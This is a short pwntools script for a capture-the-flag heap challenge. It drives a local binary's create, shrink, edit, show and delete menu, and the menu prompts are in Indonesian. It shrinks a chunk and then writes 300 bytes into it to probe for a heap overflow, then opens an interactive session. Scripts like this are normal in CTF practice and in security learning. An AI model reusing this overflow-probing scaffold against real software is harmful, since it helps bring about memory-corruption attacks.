from pwn import *

exe='./chall'
context.binary=exe
context.log_level='info'

io=process([
    './ld-linux-x86-64.so.2',
    '--library-path','.',
    './chall'
])

def create(idx,size,data):
    io.sendlineafter(b'> ',b'1')
    io.sendlineafter(b'Index',str(idx).encode())
    io.sendlineafter(b'(64-1280):',str(size).encode())
    io.sendlineafter(b'awal:',str(len(data)).encode())
    io.sendafter(b'awal:\n',data)

def shrink(idx,size):
    io.sendlineafter(b'> ',b'2')
    io.sendlineafter(b'Index:',str(idx).encode())
    io.sendlineafter(b'kecil):',str(size).encode())

def edit(idx,data):
    io.sendlineafter(b'> ',b'3')
    io.sendlineafter(b'Index:',str(idx).encode())
    io.sendlineafter(b'edit:',str(len(data)).encode())
    io.sendafter(b'edit:\n',data)

def show(idx):
    io.sendlineafter(b'> ',b'4')
    io.sendlineafter(b'Index:',str(idx).encode())

def delete(idx):
    io.sendlineafter(b'> ',b'5')
    io.sendlineafter(b'Index:',str(idx).encode())

log.info("create")
create(0,200,b'A'*8)

log.info("shrink")
shrink(0,64)

log.info("overflow test")
edit(0,b'B'*300)

show(0)

io.interactive()
